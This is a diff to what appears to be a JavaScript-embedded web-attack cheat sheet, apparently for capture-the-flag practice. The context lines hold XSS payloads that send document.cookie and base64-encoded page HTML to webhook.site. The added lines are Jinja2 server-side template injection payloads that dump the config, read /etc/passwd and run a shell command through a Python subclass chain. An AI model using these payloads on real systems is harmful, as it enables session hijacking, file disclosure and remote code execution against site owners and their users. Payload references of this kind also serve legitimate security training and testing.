@@ -130,7 +130,14 @@ Blind:
 
 Exfil:
 <script>fetch('https://webhook.site/?c='+document.cookie)</script>
-<script>fetch('https://webhook.site/?d='+btoa(document.body.innerHTML))</script>`,
+<script>fetch('https://webhook.site/?d='+btoa(document.body.innerHTML))</script>
+
+SSTI (Server-Side Template Injection)
+1. Jinja2 (Flask/Python):
+{{ 7 * 7 }}
+{{ config.items() }}
+{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
+{{ ''.__class__.__mro__[1].__subclasses__()[401](['cat', 'flag.txt'], stdout=-1).communicate()[0] }}`,
         },
         {
             id: 2,
